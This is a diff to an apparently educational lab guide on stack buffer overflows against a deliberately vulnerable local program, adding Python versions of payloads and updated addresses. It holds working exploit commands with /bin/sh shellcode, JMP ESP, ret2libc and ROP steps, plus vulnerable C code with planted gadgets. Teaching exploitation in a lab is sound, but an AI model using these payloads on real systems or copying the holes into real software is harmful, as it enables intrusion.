@@ -11,16 +11,18 @@ Author: Gabriel Maciá
 1) Execute the function success: 
    Change the value of the variable "value" to 3: 
 	   ./vuln `perl -e 'print "A"x500 . "\x03"'`
+	   ./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"\x03")')
 
 2) Execute the function success2
    - Find the value of the pointer to the function success2: 
 		   (gdb) print success2
-		   $1 = {int ()} 0x8049325 <success2>0x8049325
+		   $1 = {int ()} 0x8049339 <success2>0x8049339
            
    - Find the position of the Saved EIP with gdb --> offset of 516 bytes
    - Overflow the Saved EIP.
    
-	   ./vuln `perl -e 'print "A"x500 . "B"x16 . "\x25\x93\x04\x08"'`
+	   ./vuln `perl -e 'print "A"x500 . "B"x16 . "\x39\x93\x04\x08"'`
+	   ./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"B"*16 + b"\x39\x93\x04\x08")')
 
 3) Execute a shellcode that launches /bin/sh:
 
@@ -29,27 +31,30 @@ Author: Gabriel Maciá
 	   "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
        
    Without NOP Sled
-	   ./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`  
+	   ./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`  
+	   ./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + b"A"*475 + b"\x03" + b"B"*15 + b"\x78\xca\xff\xff")')
+
 
    With NOP Sled
-	   ./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`'
+	   ./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`'
 
 5) JMP ESP technique:  www.exploit-db.com/papers/13232
    Avoids having to know the exact position of the buffer. It is similar to the previous one, but in this case we write the payload after the savedEIP and in the savedEIP we call a JMP $ESP instruction.
        
-   root@kali:~/# sudo apt install framework2
+		root@kali:~/# sudo apt install framework2 (installed by the repository install script)
 		root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln -j esp
-		0x08049461   jmp esp
+			0x08049469   jmp esp
 		 
-	A veces no se encuentra esta instruccion, pero se puede encontrar entrelazada en otras instrucciones, dado que jmp $esp es \xff\xe4
+	Sometimes, this instruction is not found, but we can try to find it interlaced in other instructions, given that jmp $esp is \xff\xe4
 	
-	La explotación se consigue entonces asi: 
+	The exploitation is: 
 	
-		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x61\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x69\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+ 	    ./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"B"*16 + b"\x69\x94\x04\x08" + b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
 
 6) ret2libc technique. 
 Compile with NX and test the previous exploits to see that they do not execute.
-	# ./compile vuln_stack.c nx 
+	# ./python compile.py vuln_stack.c nx 
 	# mv vuln_stack vuln_stack_nx
 	# rm vuln
 	# ln -s vuln_stack_nx vuln
@@ -57,30 +62,30 @@ Compile with NX and test the previous exploits to see that they do not execute.
 Then, we use the ret2libc technique (explained in class).
 
 	(gdb) p system  (note: first set a breakpoint at main and run to load libc)
-	$1 = {<text variable, no debug info>} 0xf7e0ab30 <system>
+	$1 = {<text variable, no debug info>} 0xf7db94c0 <system>
 	(gdb) find &system,+9999999,"/bin/sh"
-	0xf7f4aaaa
+	0xf7f30e3c
 	warning: Unable to access 16000 bytes of target memory at 0xf7faa6b2, halting search.
 	1 pattern found.
 
-With PEDA, you can do:
-	gdb-peda$ searchmem "/bin/sh" 
-	Searching for '/bin/sh' in: None ranges
-	Found 1 results, display max 1 items:
-	libc : 0xf7f52f68 ("/bin/sh")
+With GEF in GDB, you can do:
+	gef➤  search-pattern "/bin/sh"
+	[+] Searching '/bin/sh' in memory
+	[+] In '/usr/lib32/libc.so.6'(0xf7f16000-0xf7f9b000), permission=r--
+	  0xf7f30e3c - 0xf7f30e43  →   "/bin/sh"
 
 
 Results obtained: 
-	system:  0xf7e0ab30
-	/bin/sh: 0xf7f4aaaa  
+	system:  0xf7db94c0
+	/bin/sh: 0xf7f30e3c  
 
 Payload to execute: 
-	./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "AAAA" . "\xaa\xaa\xf4\xf7"'`
+	./vuln `perl -e 'print "A"x500 . "B"x16 . "\xc0\x94\xdb\xf7" . "AAAA" . "\x3c\x0e\xf3\xf7"'`
 
 Now, we also include the exit function in the return to avoid segmentation fault:
-	exit: 0xf7dfdb30
+	exit: 0xf7da5ac0
 
-	./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "\x30\xdb\xdf\xf7" . "\xaa\xaa\xf4\xf7"'`
+	./vuln `perl -e 'print "A"x500 . "B"x16 . "\xc0\x94\xdb\xf7" . "\xc0\x5a\xda\xf7" . "\x3c\x0e\xf3\xf7"'`
 
 5) ROP Technique: 
 With this technique, /bin/bash will be executed using the functions present in the executable that are not used. They will be executed in a chained manner. See the script rop.py for the solution.
@@ -110,7 +115,7 @@ void callit (char *name) {
 	int value;
 	char buffer[500];
 	
-	vallue = 0;	
+	value = 0;	
 	strcpy (buffer, name);
 	printf ("-------------------\n");
 	printf ("Value : \t%p [%d]\n", &value, value);	
@@ -166,5 +171,11 @@ void add_bash(int magic1, int magic2) {
 // Function to ensure the code contains a jump to ESP (JMP ESP technique)
 void jmpesp() {
 	__asm__("jmp *%esp");
+}
+
+void gadgets() {
+	__asm__("pop %ebx");
+	__asm__("pop %ebx");
+	__asm__("ret");
 }
 
